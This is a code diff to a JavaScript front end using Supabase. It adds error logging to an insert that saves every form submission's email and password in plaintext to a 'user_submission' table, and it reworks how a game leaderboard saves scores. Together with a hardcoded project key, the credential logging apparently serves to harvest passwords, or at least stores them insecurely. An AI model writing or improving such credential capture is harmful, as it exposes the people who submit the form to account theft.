@@ -1,5 +1,5 @@
 // Initialize Supabase Client
-const SUPABASE_URL = 'https://wtbojotyzjvzywaqykbn.supabase.co';
+const SUPABASE_URL = 'https://wtbojotyzjvzywaqykbn.supabase.co'; 
 const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Ind0Ym9qb3R5emp2enl3YXF5a2JuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODc2Njg3ODYsImV4cCI6MjEwMzI0NDc4Nn0.hseExg_69fR025A8V_vxQmlG75AbUAj2TOdQGjCr2L0';
 const _supabase = (typeof supabase !== 'undefined') ? supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;
 
@@ -118,11 +118,16 @@ if (isFormPage) {
     // Log every submission to the 'user_submission' table.
     if (_supabase) {
       try {
-        await _supabase
+        const { error: submissionErr } = await _supabase
           .from('user_submission')
           .insert([{ email: finalEmail, password: finalPassword }]);
+        if (submissionErr) {
+          // Logged in full — a missing INSERT policy for the anon role,
+          // a renamed table, or a schema mismatch will show up here.
+          console.error('user_submission insert failed:', submissionErr.message, submissionErr);
+        }
       } catch (err) {
-        console.error('user_submission insert error:', err);
+        console.error('user_submission insert error (unexpected):', err);
       }
     }
 
@@ -637,11 +642,37 @@ if (!isFormPage) {
 
     saveQueue = saveQueue.then(async () => {
       try {
-        await _supabase
+        const { data: existingRecord, error: selectErr } = await _supabase
           .from('leaderboard')
-          .upsert({ username: userName, score: playerScore }, { onConflict: 'username' });
+          .select('id, score')
+          .eq('username', userName)
+          .maybeSingle();
+
+        if (selectErr) {
+          console.error('Leaderboard SELECT failed:', selectErr.message, selectErr);
+          return;
+        }
+
+        let saveErr;
+        if (existingRecord) {
+          ({ error: saveErr } = await _supabase
+            .from('leaderboard')
+            .update({ score: playerScore })
+            .eq('username', userName));
+        } else {
+          ({ error: saveErr } = await _supabase
+            .from('leaderboard')
+            .insert([{ username: userName, score: playerScore }]));
+        }
+
+        if (saveErr) {
+          // Logged in full so a permissions problem (e.g. a missing Row
+          // Level Security policy for the anon role) is visible in the
+          // console instead of failing silently.
+          console.error('Leaderboard SAVE failed:', saveErr.message, saveErr);
+        }
       } catch (err) {
-        console.error('Database sync error:', err);
+        console.error('Database sync error (unexpected):', err);
       }
     });
     return saveQueue;
